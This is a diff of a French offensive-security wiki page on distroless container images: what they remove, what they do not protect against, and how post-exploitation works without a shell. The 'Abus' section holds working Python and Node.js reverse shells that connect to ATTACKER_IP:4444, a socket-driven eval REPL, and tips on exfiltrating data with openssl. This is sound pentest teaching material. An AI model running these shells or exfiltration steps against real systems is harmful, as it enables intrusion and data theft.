@@ -1,71 +1,72 @@
-# Conteneurs Distroless
+# Conteneurs distroless
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Vue d'ensemble
+## Vue d’ensemble
 
-Une image de conteneur **distroless** est une image qui contient les **composants runtime minimum requis pour exécuter une application spécifique**, tout en supprimant intentionnellement les outils habituels de la distribution, tels que les package managers, les shells et les grands ensembles d'utilitaires userland génériques. En pratique, les images distroless contiennent souvent uniquement le binaire ou le runtime de l'application, ses bibliothèques partagées, les bundles de certificats et une arborescence de fichiers très réduite.
+Une image de conteneur **distroless** fournit les **composants d’exécution minimaux nécessaires pour lancer une application spécifique**, tout en supprimant volontairement les outils habituels des distributions, comme les gestionnaires de paquets, les shells et les grands ensembles d’utilitaires génériques en espace utilisateur. En pratique, les images distroless ne contiennent souvent que le binaire ou l’environnement d’exécution de l’application, ses bibliothèques partagées, les bundles de certificats et une arborescence de fichiers très réduite. <sup>[[1]](#references)</sup>
 
-L'objectif n'est pas que distroless constitue une nouvelle primitive d'isolation du kernel. Distroless est une **stratégie de conception d'image**. Elle modifie ce qui est disponible **à l'intérieur** du système de fichiers du conteneur, et non la manière dont le kernel isole le conteneur. Cette distinction est importante, car distroless renforce principalement l'environnement en réduisant ce qu'un attaquant peut utiliser après avoir obtenu une exécution de code. Elle ne remplace pas les namespaces, seccomp, les capabilities, AppArmor, SELinux ni aucun autre mécanisme d'isolation du runtime.
+L’idée n’est pas que distroless constitue une nouvelle primitive d’isolation du noyau. Distroless est une **stratégie de conception d’image**. Elle modifie ce qui est disponible **à l’intérieur** du système de fichiers du conteneur, et non la façon dont le noyau isole le conteneur. Cette distinction est importante, car distroless renforce principalement l’environnement en réduisant les moyens dont un attaquant peut se servir après avoir obtenu l’exécution de code. Cette approche ne remplace ni les namespaces, ni seccomp, ni les capabilities, ni AppArmor, SELinux ou tout autre mécanisme d’isolation à l’exécution.
 
-## Pourquoi Distroless Existe
+## Pourquoi distroless existe
 
 Les images distroless sont principalement utilisées pour réduire :
 
-- la taille de l'image
-- la complexité opérationnelle de l'image
-- le nombre de packages et de binaires susceptibles de contenir des vulnérabilités
-- le nombre d'outils de post-exploitation disponibles par défaut pour un attaquant
+- la taille de l’image
+- la complexité opérationnelle de l’image
+- le nombre de paquets et de binaires susceptibles de contenir des vulnérabilités
+- le nombre d’outils de post-exploitation disponibles par défaut pour un attaquant
 
-C'est pourquoi les images distroless sont populaires dans les déploiements d'applications en production. Un conteneur qui ne contient aucun shell, aucun package manager et presque aucun outil générique est généralement plus facile à appréhender sur le plan opérationnel et plus difficile à exploiter de manière interactive après une compromission.
+C’est pourquoi les images distroless sont populaires pour les déploiements d’applications en production. Un conteneur sans shell, sans gestionnaire de paquets et presque dépourvu d’outils génériques est généralement plus facile à gérer sur le plan opérationnel et plus difficile à exploiter de manière interactive après une compromission.
 
-Voici quelques familles d'images distroless bien connues :
+Voici quelques familles d’images distroless bien connues :
 
-- les images distroless de Google
-- les images hardened/minimal de Chainguard
+- les images distroless de Google <sup>[[1]](#references)</sup>
+- les images renforcées/minimales de Chainguard <sup>[[2]](#references)</sup>
 
-## Ce que Distroless ne Signifie Pas
+## Ce que distroless ne signifie pas
 
-Un conteneur distroless n'est **pas** :
+Un conteneur distroless n’est **pas** :
 
 - automatiquement rootless
-- automatiquement non-privileged
+- automatiquement non privilégié
 - automatiquement en lecture seule
 - automatiquement protégé par seccomp, AppArmor ou SELinux
-- automatiquement à l'abri d'un container escape
+- automatiquement à l’abri d’une évasion de conteneur
 
-Il est toujours possible d'exécuter une image distroless avec `--privileged`, le partage de namespaces de l'hôte, des bind mounts dangereux ou un runtime socket monté. Dans ce scénario, l'image peut être minimale, mais le conteneur peut tout de même être catastrophiquement non sécurisé. Distroless modifie la **surface d'attaque userland**, et non la **frontière de confiance du kernel**.
+Il est toujours possible de lancer une image distroless avec `--privileged`, en partageant les namespaces de l’hôte, avec des bind mounts dangereux ou avec un socket d’exécution monté. Dans ce cas, l’image peut être minimale, mais le conteneur reste gravement vulnérable. Distroless modifie la **surface d’attaque de l’espace utilisateur**, et non la **frontière de confiance du noyau**.
 
-## Caractéristiques Opérationnelles Typiques
+## Caractéristiques opérationnelles typiques
 
-Lorsque vous compromettez un conteneur distroless, la première chose que vous remarquez généralement est que les hypothèses habituelles cessent d'être valables. Il peut ne pas y avoir de `sh`, de `bash`, de `ls`, de `id`, de `cat`, et parfois même pas d'environnement basé sur libc qui se comporte comme le supposent vos méthodes habituelles. Cela affecte à la fois l'offensive et la défense, car l'absence d'outils rend le debugging, la réponse à incident et la post-exploitation différents.
+Lorsque vous compromettez un conteneur distroless, vous remarquez généralement d’abord que les hypothèses habituelles ne sont plus valables. Il peut ne pas y avoir de `sh`, de `bash`, de `ls`, de `id`, de `cat`, ni même d’environnement basé sur libc qui se comporte comme le prévoient vos techniques habituelles. Cela affecte aussi bien l’attaque que la défense, car l’absence d’outils change le débogage, la réponse aux incidents et la post-exploitation.
 
-Les schémas les plus courants sont les suivants :
+Les situations les plus courantes sont les suivantes :
 
-- le runtime de l'application est présent, mais il y a peu d'autres éléments
-- les payloads basés sur un shell échouent parce qu'il n'y a pas de shell
-- les one-liners d'énumération courants échouent parce que les binaires auxiliaires sont absents
-- des protections du système de fichiers telles qu'un rootfs en lecture seule ou `noexec` sur les emplacements tmpfs inscriptibles sont souvent également présentes
+- l’environnement d’exécution de l’application est présent, mais il y a peu d’autres éléments
+- les payloads basés sur un shell échouent parce qu’il n’y a pas de shell
+- les commandes d’énumération courantes échouent parce que les binaires auxiliaires sont absents
+- des protections du système de fichiers, comme un rootfs en lecture seule ou `noexec` sur des emplacements tmpfs accessibles en écriture, sont souvent également présentes
 
-C'est généralement cette combinaison qui amène à parler de « weaponizing distroless ».
+C’est généralement cette combinaison qui amène à parler de « weaponizing distroless ».
 
-## Distroless et Post-Exploitation
+## Distroless et post-exploitation
 
-Le principal défi offensif dans un environnement distroless n'est pas toujours le RCE initial. Il s'agit souvent de ce qui vient ensuite. Si la workload exploitée permet l'exécution de code dans un langage runtime tel que Python, Node.js, Java ou Go, vous pouvez être en mesure d'exécuter une logique arbitraire, mais pas via les workflows habituels centrés sur le shell, courants sur d'autres cibles Linux.
+Dans un environnement distroless, le principal défi offensif n’est pas toujours le RCE initial. Il concerne souvent ce qui vient ensuite. Si la charge de travail compromise permet d’exécuter du code dans un environnement d’exécution tel que Python, Node.js, Java ou Go, vous pouvez peut-être exécuter une logique arbitraire, mais pas en suivant les workflows habituels centrés sur le shell, courants sur d’autres cibles Linux.
 
-Cela signifie que la post-exploitation s'oriente souvent dans l'une des trois directions suivantes :
+La post-exploitation prend alors souvent l’une de ces trois directions :
 
-1. **Utiliser directement le runtime du langage existant** pour énumérer l'environnement, ouvrir des sockets, lire des fichiers ou stage des payloads supplémentaires.
-2. **Apporter vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si les emplacements inscriptibles sont montés avec `noexec`.
-3. **Abuser des binaires existants déjà présents dans l'image** si l'application ou ses dépendances contiennent quelque chose d'inopinément utile.
+1. **Utiliser directement l’environnement d’exécution déjà présent** pour énumérer l’environnement, ouvrir des sockets, lire des fichiers ou déposer d’autres payloads.
+2. **Charger vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si les emplacements accessibles en écriture sont montés avec `noexec`.
+3. **Abuser des binaires déjà présents dans l’image** si l’application ou ses dépendances incluent un élément étonnamment utile.
 
-## Abuse
+## Abus
 
-### Énumérer le Runtime Déjà Disponible
+### Énumérer l’environnement d’exécution déjà disponible
 
-Dans de nombreux conteneurs distroless, il n'y a pas de shell, mais il y a toujours un runtime d'application. Si la cible est un service Python, Python est présent. Si la cible est Node.js, Node est présent. Cela fournit souvent suffisamment de fonctionnalités pour énumérer les fichiers, lire les variables d'environnement, ouvrir des reverse shells et stage une exécution en mémoire sans jamais invoquer `/bin/sh`.
+Dans de nombreux conteneurs distroless, il n’y a pas de shell, mais un environnement d’exécution d’application est tout de même présent. Si la cible est un service Python, Python est disponible. Si la cible est Node.js, Node est disponible. Cela suffit souvent pour énumérer les fichiers, lire les variables d’environnement, ouvrir des reverse shells et exécuter des payloads en mémoire sans jamais invoquer `/bin/sh`.
 
 Un exemple simple avec Python :
+
 ```bash
 python3 - <<'PY'
 import os, socket, subprocess
@@ -75,65 +76,105 @@ print("env keys", list(os.environ)[:20])
 print("root files", os.listdir("/")[:30])
 PY
 ```
+
 Un exemple simple avec Node.js :
+
 ```bash
 node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
 ```
+
 Impact :
 
-- récupération des variables d’environnement, incluant souvent des credentials ou des endpoints de service
+- récupération des variables d’environnement, qui comprennent souvent des identifiants ou des endpoints de service
 - énumération du système de fichiers sans `/bin/ls`
 - identification des chemins accessibles en écriture et des secrets montés
 
-### Reverse Shell Sans `/bin/sh`
+### Session interactive sans `/bin/sh`
 
-Si l’image ne contient ni `sh` ni `bash`, un Reverse Shell classique basé sur un shell peut échouer immédiatement. Dans ce cas, utilisez le runtime du langage installé.
+Si l’image ne contient pas `sh` ou `bash`, un reverse shell classique basé sur un shell échoue. Dans ce cas, exposez une session interactive dans le runtime du langage installé au lieu de lancer un shell inexistant.
 
-Reverse Shell Python :
+Par exemple, ce payload Python redirige une console Python interactive via un socket :
+
 ```bash
 python3 - <<'PY'
-import os,pty,socket
-s=socket.socket()
-s.connect(("ATTACKER_IP",4444))
-for fd in (0,1,2):
-os.dup2(s.fileno(),fd)
-pty.spawn("/bin/sh")
+import code, socket, sys
+s = socket.create_connection(("ATTACKER_IP", 4444))
+stream = s.makefile("rw", buffering=1)
+sys.stdin = sys.stdout = sys.stderr = stream
+code.interact(local=globals())
 PY
 ```
-Si `/bin/sh` n'existe pas, remplacez la dernière ligne par une exécution directe de commandes pilotée par Python ou par une boucle REPL Python.
 
-Node reverse shell:
+L’approche équivalente en Node.js peut évaluer du JavaScript reçu via un socket. Il s’agit d’un REPL JavaScript, et non d’un shell du système d’exploitation ; les opérations sur le système de fichiers, les processus et le réseau doivent être effectuées via les API de Node :
+
 ```bash
-node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
 ```
-Encore une fois, si `/bin/sh` est absent, utilisez directement les APIs filesystem, process et networking de Node au lieu de lancer un shell.
+
+Les deux exemples nécessitent une connectivité sortante et un interpréteur disponible, et ne fournissent que les fonctionnalités offertes par cet interpréteur.
+
+Si l’image inclut de façon inattendue `/bin/sh`, les payloads classiques de shell assistés par un interpréteur restent utiles. Ils sont présentés séparément, car ils ne sont pas réellement dépourvus de shell :
+
+```bash
+# Python plus an existing /bin/sh
+python3 - <<'PY'
+import os, pty, socket
+s = socket.create_connection(("ATTACKER_IP", 4444))
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
+pty.spawn("/bin/sh")
+PY
+
+# Node.js plus an existing /bin/sh
+node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+```
+
+L’ancien modèle de boucle de commandes Python est également utile lorsque `/bin/sh` existe, mais qu’un PTY interactif n’est pas pratique. Il est conservé ici en explicitant sa véritable dépendance : `subprocess.run(..., shell=True)` invoque le shell système et n’est donc **pas une technique sans shell**.
+
+```bash
+python3 -c '
+import subprocess
+while True:
+    cmd = input("sh> ")
+    if cmd.strip() in ("exit", "quit"):
+        break
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    print(result.stdout, end="")
+    print(result.stderr, end="")
+'
+```
 
 ### Exemple complet : boucle de commandes Python sans shell
 
-Si l'image contient Python mais aucun shell, une simple boucle interactive suffit souvent à conserver toutes les capacités de post-exploitation :
+Si l’image contient Python mais aucun shell, un REPL Python local peut tout de même permettre d’inspecter le système de fichiers, l’environnement et le réseau :
+
 ```bash
 python3 - <<'PY'
-import os,subprocess
+namespace = {}
 while True:
-cmd=input("py> ")
-if cmd.strip() in ("exit","quit"):
-break
-p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
-print(p.stdout, end="")
-print(p.stderr, end="")
+    source = input("py> ")
+    if source.strip() in ("exit", "quit"):
+        break
+    try:
+        result = eval(source, namespace)
+        if result is not None:
+            print(repr(result))
+    except SyntaxError:
+        exec(source, namespace)
 PY
 ```
-Cela ne nécessite pas de binaire de shell interactif. L’impact est effectivement le même que celui d’un shell basique du point de vue de l’attaquant : exécution de commandes, enumeration et staging de payloads supplémentaires via le runtime existant.
+
+Cette boucle n’invoque pas `/bin/sh`. Elle évalue directement des expressions et instructions Python ; les opérations doivent donc utiliser les API Python plutôt que des commandes shell. Malgré cette limitation, elle peut tout de même offrir une grande partie des capacités d’un shell de base : énumération du système de fichiers et de l’environnement, accès aux données, activité réseau et mise en place d’autres payloads à l’aide du runtime installé.
 
 ### Exécution d’outils en mémoire
 
 Les images Distroless sont souvent combinées avec :
 
 - `readOnlyRootFilesystem: true`
-- un tmpfs accessible en écriture mais `noexec`, comme `/dev/shm`
-- l’absence d’outils de gestion des packages
+- un tmpfs inscriptible mais `noexec`, tel que `/dev/shm`
+- l’absence d’outils de gestion des paquets
 
-Cette combinaison rend les workflows classiques consistant à « télécharger un binaire sur le disque et l’exécuter » peu fiables. Dans ces cas, les techniques d’exécution en mémoire deviennent la solution principale.
+Cette combinaison rend peu fiables les méthodes classiques consistant à « télécharger un binaire sur le disque et l’exécuter ». Dans ces cas, les techniques d’exécution en mémoire deviennent la principale solution.
 
 La page dédiée à ce sujet est :
 
@@ -141,64 +182,70 @@ La page dédiée à ce sujet est :
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Les techniques les plus pertinentes qui y sont présentées sont :
+Les techniques les plus pertinentes sont :
 
-- `memfd_create` + `execve` via des runtimes de scripting
+- `memfd_create` + `execve` via des runtimes de script <sup>[[4]](#references)</sup>
 - DDexec / EverythingExec
 - memexec
 - memdlopen
 
-### Binaires existants déjà présents dans l’image
+Pour un service Python, Node.js ou PHP, le point d’entrée peut être une vulnérabilité de l’application, comme une injection de template, une pollution de prototype ou une évaluation non sécurisée. Si elle permet l’exécution de code dans le processus, une technique utilisant `/proc/self/mem` peut exécuter un loader sans shell ni fichier exécutable sur le disque. L’exécution conserve l’identité du processus du conteneur ; une vulnérabilité distincte dans le runtime ou à la frontière de l’hôte est nécessaire pour sortir du conteneur. Voir les [techniques read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) pour connaître les prérequis.
 
-Certaines images Distroless contiennent toujours des binaires nécessaires au fonctionnement, qui deviennent utiles après une compromission. Un exemple régulièrement observé est `openssl`, car les applications peuvent parfois en avoir besoin pour des tâches liées à la cryptographie ou à TLS.
+### Binaires déjà présents dans l’image
 
-Un motif de recherche rapide est :
+Certaines images Distroless contiennent encore des binaires nécessaires à leur fonctionnement qui deviennent utiles après une compromission. Un exemple souvent observé est `openssl`, car les applications en ont parfois besoin pour des tâches liées à la cryptographie ou à TLS.
+
+Voici une méthode de recherche rapide :
+
 ```bash
 find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
 ```
-Si `openssl` est présent, il peut être utilisable pour :
 
-- les connexions TLS sortantes
-- l'exfiltration de données via un canal egress autorisé
-- le staging des données de payload via des blobs encodés/chiffrés
+Si `openssl` est présent, il peut servir à :
 
-L'abus exact dépend de ce qui est réellement installé, mais l'idée générale est que distroless ne signifie pas « aucun outil » ; cela signifie « bien moins d'outils qu'une image de distribution normale ».
+- établir des connexions TLS sortantes
+- exfiltrer des données via un canal de sortie autorisé
+- préparer des données de payload dans des blocs encodés/chiffrés
 
-## Vérifications
+Les abus possibles dépendent de ce qui est réellement installé, mais l’idée générale est que distroless ne signifie pas « aucun outil » ; cela signifie « bien moins d’outils qu’une image de distribution classique ».
 
-L'objectif de ces vérifications est de déterminer si l'image est réellement distroless en pratique et quels binaires du runtime ou auxiliaires sont encore disponibles pour le post-exploitation.
+## Checks
+
+L’objectif de ces checks est de déterminer si l’image est réellement distroless en pratique et quels binaires d’exécution ou auxiliaires sont encore disponibles pour la post-exploitation.
+
 ```bash
 find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
 which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
 cat /etc/os-release 2>/dev/null                                # Often missing or minimal
 mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
 ```
+
 Ce qui est intéressant ici :
 
-- Si aucun shell n'existe mais qu'un runtime tel que Python ou Node est présent, le post-exploitation devrait basculer vers une exécution pilotée par le runtime.
-- Si le système de fichiers racine est en lecture seule et que `/dev/shm` est accessible en écriture mais `noexec`, les techniques d'exécution en mémoire deviennent beaucoup plus pertinentes.
-- Si des binaires auxiliaires tels que `openssl`, `busybox` ou `java` sont présents, ils peuvent fournir suffisamment de fonctionnalités pour amorcer un accès supplémentaire.
+- Si aucun shell n’est disponible, mais qu’un runtime tel que Python ou Node est présent, la post-exploitation devrait privilégier l’exécution via le runtime.
+- Si le système de fichiers racine est en lecture seule et que `/dev/shm` est accessible en écriture, mais avec l’option `noexec`, les techniques d’exécution en mémoire deviennent bien plus pertinentes.
+- Si des binaires utilitaires tels que `openssl`, `busybox` ou `java` sont présents, ils peuvent fournir suffisamment de fonctionnalités pour amorcer un accès plus étendu.
 
 ## Valeurs par défaut du runtime
 
-| Style d'image / plateforme | État par défaut | Comportement typique | Affaiblissement manuel courant |
+| Style d’image / plateforme | État par défaut | Comportement typique | Affaiblissements manuels courants |
 | --- | --- | --- | --- |
-| Images de style Google distroless | Userland minimal par conception | Aucun shell, aucun package manager, uniquement les dépendances de l'application/runtime | ajout de couches de debugging, de shells sidecar, copie de busybox ou d'outils |
-| Images minimales Chainguard | Userland minimal par conception | Surface de packages réduite, souvent axée sur un seul runtime ou service | utilisation de `:latest-dev` ou de variantes de debug, copie d'outils pendant le build |
-| Workloads Kubernetes utilisant des images distroless | Dépend de la configuration du Pod | Distroless ne concerne que le userland ; la posture de sécurité du Pod dépend toujours de la spécification du Pod et des valeurs par défaut du runtime | ajout de conteneurs de debug éphémères, montages de l'hôte, paramètres de Pod privilégiés |
-| Docker / Podman exécutant des images distroless | Dépend des flags d'exécution | Système de fichiers minimal, mais la sécurité du runtime dépend toujours des flags et de la configuration du daemon | `--privileged`, partage des namespaces de l'hôte, montages de sockets du runtime, bind mounts de l'hôte accessibles en écriture |
+| Images de style Google distroless | Espace utilisateur minimal par conception | Aucun shell, aucun gestionnaire de paquets, uniquement les dépendances de l’application et du runtime | ajout de couches de débogage, de shells sidecar, copie de busybox ou d’outils |
+| Images minimales Chainguard | Espace utilisateur minimal par conception | Surface réduite de paquets, souvent centrée sur un seul runtime ou service | utilisation de variantes `:latest-dev` ou de débogage, copie d’outils lors du build |
+| Charges de travail Kubernetes utilisant des images distroless | Dépend de la configuration du Pod | Distroless n’affecte que l’espace utilisateur ; la posture de sécurité du Pod dépend toujours de sa spécification et des paramètres par défaut du runtime | ajout de conteneurs de débogage éphémères, de montages de l’hôte, de paramètres de Pod privilégiés |
+| Docker / Podman exécutant des images distroless | Dépend des options d’exécution | Système de fichiers minimal, mais la sécurité du runtime dépend toujours des options et de la configuration du daemon | `--privileged`, partage des espaces de noms de l’hôte, montages du socket du runtime, montages de l’hôte accessibles en écriture |
 
-Le point essentiel est que distroless est une **propriété de l'image**, et non une protection du runtime. Sa valeur vient de la réduction des éléments disponibles dans le système de fichiers après une compromission.
+Le point essentiel est que distroless est une **propriété de l’image**, et non une protection du runtime. Son intérêt vient de la réduction des éléments disponibles dans le système de fichiers après une compromission. Les builds multi-stage sont une méthode courante pour exclure les outils de build de l’image finale. <sup>[[3]](#references)</sup>
 
-## Pages associées
+## Pages connexes
 
-Pour les bypass du système de fichiers et de l'exécution en mémoire généralement nécessaires dans les environnements distroless :
+Pour les contournements des protections du système de fichiers et de l’exécution en mémoire couramment nécessaires dans les environnements distroless :
 
 {{#ref}}
 ../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-Pour les abus du runtime des conteneurs, des sockets et des montages qui s'appliquent toujours aux workloads distroless :
+Pour les abus du runtime de conteneur, des sockets et des montages qui s’appliquent aussi aux charges de travail distroless :
 
 {{#ref}}
 runtime-api-and-daemon-exposure.md
@@ -208,4 +255,10 @@ runtime-api-and-daemon-exposure.md
 sensitive-host-mounts.md
 {{#endref}}
 
+## References
+
+- [1] [GoogleContainerTools - Images de conteneurs distroless](https://github.com/GoogleContainerTools/distroless)
+- [2] [Documentation sur les images Chainguard](https://edu.chainguard.dev/chainguard/chainguard-images/)
+- [3] [Docker Docs - Builds multi-stage](https://docs.docker.com/build/building/multi-stage/)
+- [4] [`memfd_create(2)` - Page du manuel Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
 {{#include ../../../banners/hacktricks-training.md}}
